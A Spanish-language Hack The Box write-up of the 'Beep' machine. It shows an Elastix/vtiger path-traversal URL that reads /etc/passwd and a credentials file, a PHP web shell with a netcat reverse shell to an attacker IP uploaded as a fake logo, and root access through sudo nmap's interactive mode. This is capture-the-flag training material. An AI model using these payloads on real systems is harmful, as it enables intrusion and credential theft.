---
layout: post
title: HTB_Beep
date: 2023/07/10
slug: HTB_Beep
heroImage: /assets/machines.jpg
---

# Beep {-}

## Introduccion {-}

La maquina del dia 27/08/2021 se Beep.

El replay del live se puede ver aqui

[![S4vitaar Beep maquina](https://img.youtube.com/vi/6pqd0QOc2Oc/0.jpg)](https://www.youtube.com/watch?v=6pqd0QOc2Oc)

No olvideis dejar un like al video y un commentario...

## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-}

#### Ping {-}

```bash
ping -c 1 10.10.10.7
```

ttl: 63 -> maquina Linux

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.7
```

Va lento

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.7 -oG allPorts
extractPorts allPorts
nmap -sC -sV -p22,25,80,110,111,143,443,878,993,995,3306,4190,4445,4559,5038,10000, 10.10.10.7 -oN targeted
```

| Puerto | Servicio      | Que se nos occure? | Que falta?           |
| ------ | ------------- | ------------------ | -------------------- |
| 22     | ssh           | Conneccion directa | usuario y contraseña |
| 25     | ssh           | Conneccion directa | usuario y contraseña |
| 80     | http          | Web, Fuzzing       |                      |
| 110    | pop3          |                    |                      |
| 111    | rpcbind       |                    |                      |
| 143    | imap          |                    |                      |
| 443    | https         | Web, Fuzzing       |                      |
| 878    | rpc           |                    |                      |
| 993    | ssl/imap      |                    |                      |
| 995    | pop3          |                    |                      |
| 3306   | mysql         |                    |                      |
| 4190   | sieve cyrus   |                    |                      |
| 4445   | upnotifyp     |                    |                      |
| 4559   | HylaFAX       |                    |                      |
| 5038   | asterisk      |                    |                      |
| 10000  | http miniserv |                    |                      |

### Analyzando la web {-}

#### Whatweb {-}

```bash
whatweb http://10.10.10.7
```

Es un Apache 2.2.3 sobre un CentOS y habla de redirection sobre el protocolo https.

#### Checkear la web {-}

Cuando nos connectamos por el puerto 80, se ve la redirection al puerto 443 y entramos directo
en un panel de authentificacion 
```bash
 elastix 
```
.

Si miramos el miniserv del puerto **10000** tambien vemos un panel de login.

En este caso buscamos por una vulnerabilidad associada a 
```bash
 elastix 
```


## Vulnerability Assessment {-}

### Elastix {-}

```bash
searchsploit elastix
```

Aqui vemos una serie de exploits y un script escrito en perl nos llama la atencion, porque permite hacer un
Local File Inclusion.

```bash
searchsploit -x 37637
```

Vemos que el exploit pasa por una url que usa path traversal.

```php
/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
```

En este caso el fichero 
```bash
 /etc/amportal.conf 
```
 lo miramos mas tarde y empezamos primero con enumerar informaciones de la maquina.

Le metemos en firefox la url siguiente: "https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/passwd%00&module=Accounts&action"
y podemos ver el fichero.

Vemos que hay multiples usuarios con una 
```bash
 /bin/bash 
```


- fanis
- spamfilter
- asterisk
- cyrus
- mysql
- root

Usamos el LFI para enumerar la maquina

```bash
https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/net/fib_trie%00&module=Accounts&action
https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//proc/net/tcp%00&module=Accounts&action
```

El fib_trie no nos muestra nada pero el tcp nos muestra los puertos internos que estan abiertos. Lo copiamos y lo pegamos en un fichero.
Como los puertos estan representado de forma hexadecimal, tenemos que tratar la data.

```bash
cat data.txt | tr ':' ' ' | awk '{print $3}' | sort -u

python3
>>> 0x0016
22
>>> 0x0019
25
>>> 0x0050
80
...
```

En el caso de un LFI ficheros interessantes podrian tambien ser 
```bash
 /proc/shed_debug 
```
 y 
```bash
 /proc/shedstat 
```
. En este caso no sirbe pero esta
bien tenerlo en cuenta.

Si miramos el fichero del exploit "https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..///etc/amportal.conf%00&module=Accounts&action"
Vemos un fichero de configuracion con credenciales para una base de datos.

Si vamos por el panel de login y probamos usuarios, nos podemos connectar como el usuario admin.

Como tenemos contraseñas, intentamos connectarnos con el usuario admin pero no va.
Intentamos como el usuario root y la misma contraseña y entramos en el panel de configuracion de **webmin**.

> [ ! ] NOTAS: Tito S4vitar nos avanza que se puede ganar accesso al systema desde el dashboard de elastix y tambien del webmin pero aqui tiraremos de otras vias.

## Vuln exploit & Gaining Access {-}

### Ganando accesso desde el vtiger {-}

Si analyzamos la url

```bash
https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/net/fib_trie%00&module=Accounts&action
```

, vemos una parte que seria

```bash
https://10.10.10.7/vtigercrm
```

. Si vamos en esta url hay otro panel de session.

Copiando una vez mas las credenciales del usuario admin, podemos entrar en el dashboard de **vtiger CRM**.

Aqui la idea para ganar accesso al systema, viene de una vulnerabilidad que pasa por cambiar el logo de la compania con un fichero de doble extension.

Si vamos a "Settings > Settings > Company Details > edit", aqui vemos que podemos cargar un fichero 
```bash
 .jpg 
```
 para cambiar el logo de la empresa.

1. Creamos un fichero con doble extension s4vishell.php.jpg

   ```php
   <?php
       system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.15 443 >/tmp/f");
   ?>
   ```

1. Nos ponemos en escucha por el puerto 443

   ```bash
   nc -nlvp 443
   ```

1. Uploadeamos el fichero a la web y cuando le damos a save ya hemos ganado accesso al systema.

```bash
whoami
#Output
asterisk
```

### Tratamiento de la TTY {-}

```bash
script /dev/null -c bash
^Z
stty raw -echo; fg
-> reset
-> xterm
export TERM=xterm
export SHELL=bash

stty -a

stty rows <rownb> columns <colnb>
```

## Privilege Escalation {-}

### Rootear la maquina {-}

```bash
sudo -l
```

Aqui vemos que tenemos derechos de ejecutar como el usuario root muchos binarios si proporcionar contraseña. Entre ellos

- /bin/chown
- /bin/chmod
- /sbin/service
- /usr/bin/nmap

Aqui tiramos por el binario de nmap

```bash
nmap --version
#Output
4.11

sudo nmap --interactive
!sh
whoami
#Output
root
```

Ya estamos root y podemos leer las flags.

### Otra forma de rootear la maquina {-}

Tambien podriamos rootear la maquina mediante un shellshock attack.

Si vamos a la url de login del puerto 10000 
```bash
 https://10.10.10.7:10000/session_login.cgi 
```
, vemos que el fichero es un fichero con extension 
```bash
 .cgi 
```
.
Un shellshock attack pasa por burlar el user-agent de la peticion. Para esto utilizamos Burpsuite.

1. Una vez interceptada la peticion a la url de login.cgi, cambiamos la cabezera del User-Agent de la siguiente forma:

![Bee-shellshock-reverse-shell](/assets/images/Beep-shellshock-reverse-shell.png)

1. Nos ponemos en escucha por el puerto 443

   ```bash
   nc -nlvp 443
   ```

1. En Burpsuite le damos a Forward

Y ganamos accesso al systema como el usuario root ;)
